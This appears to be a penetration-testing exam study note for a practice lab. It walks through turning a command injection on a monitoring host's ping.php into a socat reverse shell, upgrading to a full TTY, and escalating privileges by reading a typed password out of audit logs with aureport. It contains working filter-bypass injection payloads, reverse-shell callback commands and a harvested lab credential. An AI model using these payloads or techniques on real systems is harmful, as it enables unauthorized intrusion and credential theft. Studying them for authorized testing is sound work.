# Section 6 — Initial Access

> Transition from external web exploitation to internal network foothold. Takes the command injection on monitoring.inlanefreight.local and turns it into a stable reverse shell, then escalates to a second user via credential harvesting from audit logs.

---

## Methodology — From Command Injection to Stable Shell

The chain so far:
1. Command injection on `monitoring.inlanefreight.local/ping.php` (filter bypass with `%0a`, single quotes, `${IFS}`)
2. RCE as `webdev` user
3. Host is dual-homed: `ens192 = 172.16.8.120` (internal `172.16.8.0/23`)
4. `socat` is available and not blacklisted

Now: catch a reverse shell → upgrade to full TTY → enumerate → escalate.

---

## Step 1 — Reverse Shell via Socat

### Start Listener on Attack Host

```bash
nc -nvlp 8443
```
> Standard Netcat listener on port 8443. Any high port works — just make sure it's not in use and matches the payload.

### Fire the Socat Payload via Burp

Send this GET request through Burp Repeater:

```
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:YOUR_IP:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
Cookie: PHPSESSID=<your_session>
```
> The same filter bypass technique from section 5: `%0a` (newline) to inject a second command, single quotes to break the word `socat` past the blacklist (`'s'o'c'a't'`), and `${IFS}` to replace spaces. The socat command connects back to your listener and pipes a bash shell through the TCP connection.

**Result:** Reverse shell as `webdev`.

```
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

---

## Step 2 — Upgrade to Full Interactive TTY

The basic Netcat shell has no job control, no tab completion, and commands like `su`, `sudo`, and `ssh` won't work properly. Two options:

### Option A — Python PTY (Quick and Dirty)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> Spawns a pseudo-terminal. Enough for `su` and basic interaction, but still no proper terminal size, no Ctrl+C handling, and text editors won't work right.

### Option B — Socat Full TTY (Better)

**On attack host** — start a Socat listener that connects your real terminal:

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4443
```
> `file:\`tty\`` attaches your actual terminal device. `raw,echo=0` puts the terminal in raw mode (passes all keystrokes directly) and disables local echo (so you don't see doubled characters). This gives the remote shell a proper TTY with full terminal capabilities.

**On target** (from the Netcat shell) — connect back with Socat:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:4443
```
> `exec:'bash -li'` spawns an interactive login bash shell. `pty` allocates a pseudo-terminal. `stderr` redirects stderr to the connection. `setsid` creates a new session (needed for job control). `sigint` enables Ctrl+C handling. `sane` sets sane terminal options. Combined, this gives you a shell that behaves like an SSH session.

**Result:** Full interactive shell as `webdev@dmz01`.

> The Socat method is worth memorizing. It's the best reverse shell upgrade when socat is available on the target — you get proper terminal handling, can run `su`/`sudo`/`ssh`, use tab completion, and open text editors. Module connection: **Shells & Payloads** (Types of Shells), **Pivoting/Tunneling** (socat usage).

---

## Step 3 — Privilege Escalation: webdev → srvadm

### Enumerate Group Memberships

```bash
id
```
```
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
```

> The `adm` group (GID 4) is immediately interesting. Members of `adm` can read all log files in `/var/log/`. This includes authentication logs, audit logs, cron logs, and more. Module connection: **Linux Privilege Escalation** (Privileged Groups section).

### Read Audit Logs with aureport

```bash
aureport --tty | less
```
> `aureport` reads the Linux audit daemon logs (`/var/log/audit/audit.log`). The `--tty` flag filters for TTY-related events — keyboard input recorded during interactive sessions. This can capture passwords typed into `su`, `sudo`, `ssh`, and other interactive commands.

**Key output:**

```
# date time event auid term sess comm data
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>
```

> The audit log captured someone (auid 1004 = webdev) running `su srvadm` and typing the password `ILFreightnixadm!`. TTY audit logging records raw keystrokes — passwords included. This is why the `adm` group membership matters: it gave us access to logs that contained credentials.

**Credentials found:** `srvadm:ILFreightnixadm!`

### Switch to srvadm

```bash
su srvadm
```
> Enter password `ILFreightnixadm!` when prompted.

```bash
/bin/bash -i
```
> The `su` command may drop you into `/bin/sh` depending on the user's configured shell. Explicitly spawn an interactive bash shell to get a proper prompt and bash features.

**Result:**
```
srvadm@dmz01:/var/www/html/monitoring$
uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
```

---

## What We Have Now

| Item | Value |
|------|-------|
| Host | dmz01 (monitoring.inlanefreight.local) |
| External IP | 10.129.203.101 (ens160) |
| Internal IP | 172.16.8.120 (ens192) |
| User | srvadm |
| Access method | Socat reverse shell via command injection |
| Network position | Dual-homed — bridge to 172.16.8.0/23 |

---

## Attack Chain So Far

```
External recon (Nmap + DNS + vhost fuzzing)
  → 11 subdomains discovered
  → monitoring.inlanefreight.local: brute-force login (admin:12qwaszx)
  → Command injection on /ping.php (filter bypass: %0a + quotes + $IFS)
  → Reverse shell via socat as webdev
  → adm group → aureport --tty → credential leak in audit logs
  → su srvadm (ILFreightnixadm!)
  → NEXT: escalate to root → establish persistence → pivot into 172.16.8.0/23
```

---

## Exam Relevance

- **Socat reverse shell** is the go-to when nc/netcat are blacklisted — memorize both the payload and the full TTY upgrade commands
- **Always check group memberships immediately** after landing a shell — `adm`, `docker`, `lxd`, `disk`, `sudo` all have privesc implications
- **Audit logs are a goldmine** — `aureport --tty` captures keystrokes including passwords. Also check `/var/log/auth.log`, `/var/log/syslog`, and `.bash_history` files for all users you can read
- **Don't skip the TTY upgrade** — you'll need `su` and `sudo` for nearly every privesc path, and they require a proper terminal
- The password `ILFreightnixadm!` follows a pattern (company name + role + special char) — keep an eye out for password patterns throughout the engagement, they often repeat across the environment
